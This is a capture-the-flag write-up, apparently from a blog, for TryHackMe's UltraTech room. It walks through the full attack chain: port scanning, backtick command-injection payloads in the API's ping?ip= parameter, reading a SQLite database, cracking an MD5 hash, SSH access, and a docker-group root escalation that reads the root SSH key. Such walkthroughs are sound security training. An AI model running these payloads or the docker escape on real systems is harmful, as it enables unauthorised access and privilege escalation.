---
clayout: ctf
title: UltraTech
type: TryHackMe
date: 2025-09-27
level: Medium
icon: /ctf/tryhackme/ultra-tech/icon-room.png
image: /ctf/tryhackme/ultra-tech/icon-room.png
description: UltraTech
ctf-link: https://tryhackme.com/room/ultratech1
---

## Challenge Overview

UltraTech is a **web application** challenge focused on exploiting a vulnerable API endpoint through **command injection** to gain initial access. The challenge involves a Docker environment where the goal is to escalate privileges to root by leveraging Docker group membership.

## Enumeration

### Nmap Scan

```bash
nmap -sCV -p- -oN nmap 10.10.52.175
```

**Scan Results:**

```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## Web Enumeration

When accessing `http://10.10.52.175:8081/`, we discover the **UltraTech API** page.

![UltraTech API](/ctf/tryhackme/ultra-tech/api.png)

Browsing to `http://10.10.52.175:31331/` exposes the **UltraTech** home page.

![UltraTech Home](/ctf/tryhackme/ultra-tech/home.png)

Looking at the `robots.txt` file, we can see a reference to a hidden file called `utech_sitemap.txt`.

```txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Navigating to `http://10.10.52.175:31331/utech_sitemap.txt` reveals a sitemap file.

```txt
/
/index.html
/what.html
/partners.html
```

Looking at the sitemap, we can see a hidden page called `partners.html` which shows us a login page.

![UltraTech Partners](/ctf/tryhackme/ultra-tech/partners.png)

### Source Code Analysis

Examining the page source reveals a JavaScript file (`api.js`) that handles authentication and periodically sends requests to the `ping?ip=` endpoint every 10 seconds.

```bash
PING 10.10.52.175 (10.10.52.175) 56(84) bytes of data. 64 bytes from 10.10.52.175: icmp_seq=1 ttl=64 time=0.015 ms --- 10.10.52.175 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
```

## Exploitation

### Command Injection Vulnerability

The `ip` parameter is vulnerable to **command injection** because user input is directly passed to the system command without proper sanitization.

**Testing the vulnerability:**

```url
http://10.10.52.175:8081/ping?ip=%60ls%60;
```

**Response:**

```bash
ping: utech.db.sqlite: Name or service not known
```

The error message reveals the presence of a `utech.db.sqlite` file, confirming that our injected command (`ls`) was executed successfully.

### Extracting Database Contents

**Reading the SQLite database:**

```url
http://10.10.52.175:8081/ping?ip=%60cat%20utech.db.sqlite%60;
```

**Response:**

```bash
f357a0c52799563c7c7b76c1e7543a32
```

This reveals an MD5 hash that appears to be associated with the `r00t` user account.

### Hash Cracking

**Cracking the MD5 hash with Hashcat:**

```bash
hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt
```

**Cracked result:**

```bash
f357a0c52799563c7c7b76c1e7543a32:n100906
```

The password for the `r00t` user is `n100906`.

### Initial Access

**SSH login with discovered credentials:**

```bash
ssh r00t@10.10.52.175
```

**Verifying access:**

```bash
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

We have successfully gained initial access as the `r00t` user.

## Privilege Escalation (r00t → root)

### Docker Group Privilege Escalation

**Checking user groups:**

```bash
r00t@ultratech-prod:~$ groups
r00t docker
```

The `r00t` user is a member of the `docker` group, which provides significant privileges for privilege escalation.

**Why Docker group membership is dangerous:**

Members of the `docker` group can execute Docker commands without `sudo`, which allows them to:

- Run containers with elevated privileges
- Mount host filesystems into containers
- Access the host system through container escape techniques

**Exploiting Docker group membership:**

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

**Result:**

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

::: details Command explanation

- `docker run`: Creates and runs a new container
- `-v /:/mnt`: Mounts the entire host root filesystem (`/`) to `/mnt` inside the container
- `--rm`: Automatically removes the container when it exits
- `-it`: Interactive terminal mode
- `bash`: The container image to use
- `chroot /mnt sh`: Changes the root directory to the mounted filesystem and spawns a shell

:::

> [!IMPORTANT] Final flag
> `/root/.ssh/id_rsa`
